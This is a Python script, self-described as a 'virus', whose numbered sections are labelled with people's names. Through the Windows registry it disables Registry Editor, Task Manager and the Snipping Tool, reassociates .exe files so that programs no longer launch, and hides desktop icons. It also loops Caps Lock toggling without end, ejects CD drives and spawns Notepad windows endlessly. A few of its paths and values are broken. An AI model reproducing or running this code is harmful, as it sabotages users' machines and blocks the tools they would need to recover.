##  Author : azronaftara ##
##  Created at : 2023 ##

import winreg as reg
import subprocess, time, ctypes, win32com.client

def create_virus(root_key, key_path, key_name, value_type ,value):
    key = reg.CreateKey(root_key, key_path)
    reg.SetValueEx(key, key_name, 0, value_type, value)
    reg.CloseKey(key)

# 1. Imron (disable registry editor)
virus1 = {      
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    'key_name': 'DisableRegistryTools',
    'value_type': reg.REG_DWORD,
    'value': 1
}
create_virus(**virus1)

# 2. Laras (disable task manager)
virus2 = {
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System',
    'key_name': 'DisableTaskMgr',
    'value_type': reg.REG_DWORD,
    'value': 1
}
create_virus(**virus2)

# 3. Alin 
key2 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Colors')
reg.SetValueEx(key2, 'WindowText', 0, reg.REG_SZ, "0 255 0")
reg.CloseKey(key2)

# 4. Fitri (disable snipping tools)
key3 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Policies\\Microsoft\\TabletPC')
reg.SetValueEx(key3, 'DisableSnippingTool', 0, reg.REG_DWORD, 1)
reg.CloseKey(key3)

# 5. Asti
file_extension = ".exe"
file_type = ".hank"
command = f'assoc {file_extension}={file_type}'
subprocess.run(command, shell=True)

# 6. Hanum
key4 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Policies\\Microsoft\\Windows\\System')
reg.SetValueEx(key4, 'DisableCMD', 0, reg.REG_DWORD, 0)
reg.CloseKey(key4)

# 7. Adis
key5 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'SOFTWARE\\Windows\\CurrentVersion\\Explorer\\Advanced')
reg.SetValueEx(key5, 'HideIcons', 0, reg.REG_DWORD, 1)
reg.CloseKey(key5)

# 8. Elok
key6 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Desktop')
reg.SetValueEx(key6, 'WallpaperStyle', 0, reg.REG_SZ, '0')
reg.CloseKey(key6)

# 9. Diana
virus7 = {
    'root_key': reg.HKEY_LOCAL_MACHINE,
    'key_path': 'SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSleep',
    'key_name': 'value',
    'value_type': reg.REG_DWORD,
    'value': 1
}
create_virus(**virus7)

# 10. Andriani
key7 = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RegEdit')
reg.SetValueEx(key7, 'FontSize', 0, reg.REG_DWORD, 0x00000010a)
reg.CloseKey(key7)

# 11. Fika
virus8 = {
    'root_key': reg.HKEY_CURRENT_USER,
    'key_path': 'SOFTWARE\\Microsoft\\Command Processor',
    'key_name': 'DefaultColor',
    'value_type': reg.REG_DWORD,
    'value': 2
}
create_virus(**virus8)

# 12. Ana
key8 = reg.CreateKey(reg.HKEY_CURRENT_USER, 'Control Panel\\Colors')
reg.SetValueEx(key8, 'Window', 0, reg.REG_SZ, "255 255 0")
reg.CloseKey(key8)

# 13. Ajeng
def toggle_caps_lock():
    while True:
        time.sleep(0.1)

        caps_lock_state = ctypes.windll.user32.GetKeyState(0x14)

        # Toggle the Caps Lock state
        if caps_lock_state & 1 == 1:
            ctypes.windll.user32.keybd_event(0x14, 0, 0x2, 0)
        else:
            ctypes.windll.user32.keybd_event(0x14, 0, 0x1, 0)

if __name__ == "__main__":
    toggle_caps_lock()

# 14. Anin
def toggle_caps_lock(duration_seconds=30):
    end_time = time.time() + duration_seconds

    while time.time() < end_time:
        time.sleep(0.1)

        wmp = win32com.client.Dispatch("WMPlayer.OCX.7")

        cdroms = wmp.cdromCollection

        if cdroms.Count >= 1:
            for i in range(cdroms.Count):
                cdroms.Item(i).Eject()

if __name__ == "__main__":
    toggle_caps_lock(duration_seconds=30)

# 15. Ilham
def disable_snipping_tool():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    value_name = "DisableSnippingTool"

    try:
        key = ctypes.windll.advapi32.RegOpenKeyExW(
            ctypes.c_uint(0x80000001),  # HKEY_CURRENT_USER
            ctypes.c_wchar_p(key_path),
            0,
            ctypes.c_uint(0x20006),  # KEY_SET_VALUE | KEY_WOW64_64KEY
            ctypes.pointer(ctypes.c_uint(0)),
        )

        ctypes.windll.advapi32.RegSetValueExW(
            key,
            ctypes.c_wchar_p(value_name),
            0,
            ctypes.c_uint(1),  # REG_DWORD
            ctypes.pointer(ctypes.c_uint(1)),
            ctypes.c_uint(4),
        )

        ctypes.windll.advapi32.RegCloseKey(key)

        print("Snipping Tool berhasil dinonaktifkan. Mungkin perlu me-restart Explorer atau me-restart sistem.")
    except Exception as e:
        print(f"Gagal menonaktifkan Snipping Tool: {e}")

# 16. Adam
while True:
    subprocess.Popen(r'%SystemRoot\system32\notepad.exe', shell=True)
    time.sleep(1)

# 17. Agus

# 18. Anjali
